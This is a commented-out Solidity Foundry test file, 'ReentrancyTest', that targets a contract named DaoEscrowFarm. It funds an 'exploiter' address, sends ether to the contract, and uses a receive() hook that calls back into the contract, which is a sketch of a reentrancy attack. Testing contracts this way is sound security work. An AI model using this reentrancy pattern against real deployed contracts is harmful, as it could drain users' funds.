// // SPDX-License-Identifier: MIT
// pragma experimental ABIEncoderV2;
// pragma solidity ^0.6.11;

// import "../DaoEscrowFarm.sol";
// import "forge-std/Test.sol";
// import "forge-std/console.sol";

// contract ReentrancyTest is Test {
//     DaoEscrowFarm cntrct;

//     address public exploiter = mkaddr("exploiter");

//     function setUp() public {
//         cntrct = new DaoEscrowFarm();
//         vm.deal(address(this), 1.8 ether);
//         vm.deal(address(cntrct), type(uint256).max - .02 ether);
//     }

//     function mkaddr(string memory name) public returns (address) {
//         address addr = address(
//             uint160(uint256(keccak256(abi.encodePacked(name))))
//         );
//         vm.label(addr, name);
//         vm.deal(addr, 10 ether);
//         return addr;
//     }

//     function testDaoEscrowFarm() public {
//         vm.startPrank(exploiter);
//         address(cntrct).call{value: .01 ether}("");
//         address(cntrct).call{value: 1 ether}("");
//     }

//     receive() external payable {
//         console.log("reached receive %s", msg.value);
//         address(cntrct).call{value: 0.01 ether}("");
//     }

//     fallback() external {
//         console.log("reached fallback");
//     }
// }
